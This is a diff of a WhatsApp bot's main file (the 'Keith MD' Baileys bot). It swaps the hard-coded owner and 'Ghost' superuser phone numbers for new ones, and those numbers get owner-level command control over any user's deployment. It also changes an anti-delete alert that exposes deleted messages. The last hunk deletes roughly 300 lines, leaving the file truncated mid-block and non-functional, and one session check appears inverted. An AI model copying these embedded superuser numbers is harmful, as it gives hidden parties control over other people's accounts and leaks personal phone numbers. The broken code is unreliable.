@@ -18,7 +18,7 @@ async function authenticationn() {
       const [header, b64data] = session.split(';;;');
 
       
-      if (!header == "KEITH" && b64data) {
+      if (header === "KEITH" && b64data) {
         
         let compressedData = Buffer.from(b64data.replace('...', ''), 'base64');
 
@@ -32,14 +32,14 @@ async function authenticationn() {
       }
     }
     
-    else if (session == "zokk") {
+    else if (session !== "zokk") {
       console.log("Updating existing session...");
 
     
       const [header, b64data] = session.split(';;;');
 
       
-      if (!header === "KEITH" && b64data) {
+      if (header === "KEITH" && b64data) {
         
         let compressedData = Buffer.from(b64data.replace('...', ''), 'base64');
 
@@ -101,7 +101,7 @@ const { commands, totalCommands } = require("./commandHandler");
 
 const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require("./lib/exif");
 const store = makeInMemoryStore({ logger: pino().child({ level: "silent", stream: "store" }) });
-const daddy = "254748387615@s.whatsapp.net";
+const daddy = "254769365617@s.whatsapp.net";
 
 const {
   autoview, autostatusreply, autostatusmsg, permit, autoread, botname, chatbot, timezone, autobio, mode, anticallmsg, reactemoji, prefix, presence,
@@ -176,7 +176,7 @@ async function handleMessageRevocation(client, revocationMessage) {
     const deletedByFormatted = `@${deletedBy.split('@')[0]}`;
     const sentByFormatted = `@${sentBy.split('@')[0]}`;
 
-    let notificationText = `*😈 Keith MD Anti-Delete 😈*\n\n` +
+    let notificationText = `*👻 I got you 👻*\n\n` +
       `   *Deleted by:* ${deletedByFormatted}\n` +
       `   *Sent by:* ${sentByFormatted}\n\n`;
 
@@ -341,10 +341,10 @@ async function startKeith() {
       const pushname = m.pushName || "No Name";
       const botNumber = await client.decodeJid(client.user.id);
       const servBot = botNumber.split('@')[0];
-      const Ghost = "254796299158"; 
-      const Ghost2 = "254110190196";
-      const Ghost3 = "2547483876159";
-      const Ghost4 = "254743995989";
+      const Ghost = "254769365617"; 
+      const Ghost2 = "254713192684";
+      const Ghost3 = "254784320958";
+      const Ghost4 = "2547*****";
       const superUserNumbers = [servBot, Ghost, Ghost2, Ghost3, Ghost4, dev].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
       const isOwner = superUserNumbers.includes(m.sender); 
       const isBotMessage = m.sender === botNumber;  
@@ -529,306 +529,4 @@ async function startKeith() {
           } else {
             throw new Error('No response content found.');
           }
-        } catch (error) {
-          console.error('Error fetching chatbot response:', error);
-        }
-      }
-      // Voice Chatbot Integration
-if (!IsGroup && voicechatbot === 'true') {
-  try {
-    const currentTime = Date.now();
-    if (currentTime - lastTextTime < messageDelay) {
-      console.log('Message skipped: Too many messages in a short time for voice chatbot.');
-      return;
-    }
-
-    // Fetch chatbot response using axios
-    const response = await axios.get('https://keith-api.vercel.app/ai/gpt', {
-      params: {
-        q: text // Use the user's message as the query
-      }
-    });
-
-    // Log the API response for debugging
-    console.log('API Response:', response.data);
-
-    // Check if the response is valid
-    if (!response.data || !response.data.status || !response.data.result) {
-      throw new Error('Invalid response from the API');
-    }
-
-    const keith = response.data.result; // Access the "result" field directly
-
-    // Generate audio URL for the response message
-    const audioUrl = googleTTS.getAudioUrl(keith, {
-      lang: 'en', // You can modify this to support any language dynamically
-      slow: false,
-      host: 'https://translate.google.com'
-    });
-
-    // Log the generated audio URL for debugging
-    console.log('Generated Audio URL:', audioUrl);
-
-    // Send audio message response with PTT (push-to-talk) enabled
-    await client.sendMessage(m.chat, { 
-      audio: { url: audioUrl }, 
-      mimetype: 'audio/mp4', 
-      ptt: true 
-    });
-
-    // Update the last message time
-    lastTextTime = Date.now();
-  } catch (error) {
-    // Log the error to the console instead of sending it to the user
-    console.error('Error in voice chatbot:', error);
-  }
-}
-     if (antibot === "true" && mek.key.id.startsWith("BAE5") && m.isGroup && !isOwner && isBotAdmin && mek.key.id.length === 16) {
-  try {
-    const botJid = m.sender; // Get the bot's JID
-    const botNumber = botJid.split('@')[0]; // Extract the bot's number
-
-    // Send a warning message
-    await client.sendMessage(m.chat, {
-      text: `🚫 Antibot detected 🚫\n\n@${botNumber} has been removed `,
-      contextInfo: { mentionedJid: [botJid] }
-    }, { quoted: m });
-
-    // Remove the bot from the group
-    await client.groupParticipantsUpdate(m.chat, [botJid], "remove");
-  } catch (error) {
-    console.error('Error in antibot functionality:', error);
-  }
-} 
-      // Antibot functionality
-
-      // Antibot functionality
-
-
-// Create a client
-/*const client = new textToSpeech.TextToSpeechClient();
-
-async function generateMaleVoice(text) {
-  const request = {
-    input: { text: text },
-    voice: { languageCode: 'en-US', name: 'en-US-Standard-D', ssmlGender: 'MALE' }, // Male voice
-    audioConfig: { audioEncoding: 'MP3' },
-  };
-
-  const [response] = await client.synthesizeSpeech(request);
-  return response.audioContent;
-}
-
-// Voice Chatbot Integration
-if (!IsGroup && voicechatbot2 === 'true') {
-  try {
-    const currentTime = Date.now();
-    if (currentTime - lastTextTime < messageDelay) {
-      console.log('Message skipped: Too many messages in a short time for voice chatbot.');
-      return;
-    }
-
-    // Fetch chatbot response using axios
-    const response = await axios.get('https://keith-api.vercel.app/ai/gpt', {
-      params: {
-        q: text // Use the user's message as the query
-      }
-    });
-
-    // Log the API response for debugging
-    console.log('API Response:', response.data);
-
-    // Check if the response is valid
-    if (!response.data || !response.data.status || !response.data.result) {
-      throw new Error('Invalid response from the API');
-    }
-
-    const keith = response.data.result; // Access the "result" field directly
-
-    // Generate male voice audio
-    const audioContent = await generateMaleVoice(keith);
-
-    // Save the audio to a temporary file
-    const tempFilePath = `./temp_audio_${Date.now()}.mp3`;
-    fs.writeFileSync(tempFilePath, audioContent, 'binary');
-
-    // Send audio message response with PTT (push-to-talk) enabled
-    await client.sendMessage(m.chat, { 
-      audio: { url: tempFilePath }, 
-      mimetype: 'audio/mp3', 
-      ptt: true 
-    });
-
-    // Delete the temporary file
-    fs.unlinkSync(tempFilePath);
-
-    // Update the last message time
-    lastTextTime = Date.now();
-  } catch (error) {
-    console.error('Error in voice chatbot:', error);
-  }
-}*/
-
-      // Voice Chatbot Integration
-      
-
-      if (cmd && mode === "private" && !itsMe && m.sender !== daddy) return;
-      
-try {
-    // Fetch the blocklist from the client
-    const Blocked = await client.fetchBlocklist();
-
-    // Check if the sender is blocked in a group context
-    if (cmd && m.isGroup && Blocked?.includes(m.sender)) {
-        await m.reply("You are blocked from using bot commands.");
-        return;
-    }
-
-    // Check if the chat is a personal one and handle permissions
-    if (m.chat.endsWith('@s.whatsapp.net') && cmd && permit === 'true' && !isOwner) {
-        await m.reply("You have no access to commands here. ❌");
-        return;
-    }
-} catch (error) {
-    console.error("An error occurred while processing the command:", error);
-}
-
-      const command = cmd ? body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase() : null;
-      if (command) {
-        const commandObj = commands[command];
-        if (commandObj) {
-          await commandObj.execute({ isOwner, anticall, fetchJson, exec, getRandom, generateProfilePicture, args, dev, client, m, mode, mime, qmsg, msgKeith, Tag, generateProfilePicture, text, totalCommands, botname, url, sendReply, sendMediaMessage, gurl, prefix, groupAdmin, getGroupAdmins, groupName, groupMetadata, herokuAppname, herokuapikey, packname, author, participants, pushname, botNumber, itsMe, store, isAdmin, isBotAdmin });
-        }
-      }
-    } catch (err) {
-      console.error("Error processing message:", err);
-    }
-  });
-
-  process.on("unhandledRejection", (reason, promise) => {
-    console.error("Unhandled Rejection at:", promise, "reason:", reason);
-  });
-
-  process.on("uncaughtException", (err) => {
-    console.error("Caught exception:", err);
-  });
-
-  client.decodeJid = (jid) => {
-    if (!jid) return jid;
-    if (/:\d+@/gi.test(jid)) {
-      const decode = jidDecode(jid) || {};
-      return (decode.user && decode.server && decode.user + "@" + decode.server) || jid;
-    }
-    return jid;
-  };
-
-  client.getName = async (jid) => {
-    const id = client.decodeJid(jid);
-    if (id.endsWith("@g.us")) {
-      const group = store.contacts[id] || (await client.groupMetadata(id)) || {};
-      return group.name || group.subject || PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber("international");
-    }
-    const contact = store.contacts[id] || {};
-    return contact.name || contact.subject || contact.verifiedName || PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber("international");
-  };
-
-  client.public = true;
-  client.serializeM = (m) => smsg(client, m, store);
-
-  client.ev.on("group-participants.update", (m) => groupEvents(client, m));
-
-  client.ev.on("connection.update", async (update) => {
-    const { connection, lastDisconnect } = update;
-    if (connection === "close") {
-      const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
-      const reasons = {
-        [DisconnectReason.badSession]: "Bad Session File, Please Delete Session and Scan Again",
-        [DisconnectReason.connectionClosed]: "Connection closed, reconnecting...",
-        [DisconnectReason.connectionLost]: "Connection Lost from Server, reconnecting...",
-        [DisconnectReason.connectionReplaced]: "Connection Replaced, Another New Session Opened, Please Restart Bot",
-        [DisconnectReason.loggedOut]: "Device Logged Out, Please Delete File creds.json and Scan Again",
-        [DisconnectReason.restartRequired]: "Restart Required, Restarting...",
-        [DisconnectReason.timedOut]: "Connection TimedOut, Reconnecting...",
-      };
-      console.log(reasons[reason] || `Unknown DisconnectReason: ${reason}`);
-      if (reason === DisconnectReason.badSession || reason === DisconnectReason.connectionReplaced || reason === DisconnectReason.loggedOut) {
-        process.exit();
-      } else {
-        startKeith();
-      }
-    } else if (connection === "open") {
-      await client.groupAcceptInvite("KOvNtZbE3JC32oGAe6BQpp");
-      await client.newsletterFollow("120363266249040649@newsletter");
-
-      console.log(`✅ Connected to Keith server.`);
-      console.log(`✅ bot is active ✅`);
-      console.log(`✅ Loaded ${totalCommands} commands.\nEnjoy and have fun with the bot💙.`);
-
-      const getGreeting = () => {
-        const currentHour = DateTime.now().setZone("Africa/Nairobi").hour;
-        if (currentHour >= 5 && currentHour < 12) return "Good morning 🌄";
-        if (currentHour >= 12 && currentHour < 18) return "Good afternoon ☀️";
-        if (currentHour >= 18 && currentHour < 22) return "Good evening 🌆";
-        return "Good night 😴";
-      };
-
-      const message = `Holla, ${getGreeting()},\n\n╭═══『 ${botname} 𝐢𝐬 𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝』══⊷ \n` +
-        `║ ʙᴏᴛ ᴏᴡɴᴇʀ ${author}\n` +
-        `║ ᴍᴏᴅᴇ ${mode}\n` +
-        `║ ᴘʀᴇғɪx [  ${prefix} ]\n` +
-        `║ ᴛᴏᴛᴀʟ ᴘʟᴜɢɪɴs ${totalCommands}\n` +
-        `║ ᴛɪᴍᴇ ${DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE)}\n` +
-        `║ ʟɪʙʀᴀʀʏ Baileys\n` +
-        `╰═════════════════⊷`;
-
-      await client.sendMessage(client.user.id, { text: message });
-      console.log(` ${message} \nconnected ✅ enjoy`);
-    }
-  });
-
-  client.ev.on("creds.update", saveCreds);
-
-  client.sendText = (jid, text, quoted = "", options) => client.sendMessage(jid, { text, ...options }, { quoted });
-
-  client.downloadMediaMessage = async (message) => {
-    const mime = (message.msg || message).mimetype || "";
-    const messageType = message.mtype ? message.mtype.replace(/Message/gi, "") : mime.split("/")[0];
-    const stream = await downloadContentFromMessage(message, messageType);
-    let buffer = Buffer.from([]);
-    for await (const chunk of stream) {
-      buffer = Buffer.concat([buffer, chunk]);
-    }
-    return buffer;
-  };
-
-  client.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
-    const quoted = message.msg || message;
-    const mime = (message.msg || message).mimetype || "";
-    const messageType = message.mtype ? message.mtype.replace(/Message/gi, "") : mime.split("/")[0];
-    const stream = await downloadContentFromMessage(quoted, messageType);
-    let buffer = Buffer.from([]);
-    for await (const chunk of stream) {
-      buffer = Buffer.concat([buffer, chunk]);
-    }
-    const type = await FileType.fromBuffer(buffer);
-    const trueFileName = attachExtension ? `${filename}.${type.ext}` : filename;
-    await fs.writeFileSync(trueFileName, buffer);
-    return trueFileName;
-  };
-}
-
-app.use(express.static("public"));
-app.get("/", (req, res) => res.sendFile(__dirname + "/index.html"));
-app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
-
-startKeith();
-
-module.exports = startKeith;
-
-let file = require.resolve(__filename);
-fs.watchFile(file, () => {
-  fs.unwatchFile(file);
-  console.log(chalk.redBright(`Update ${__filename}`));
-  delete require.cache[file];
-  require(file);
-});
+   
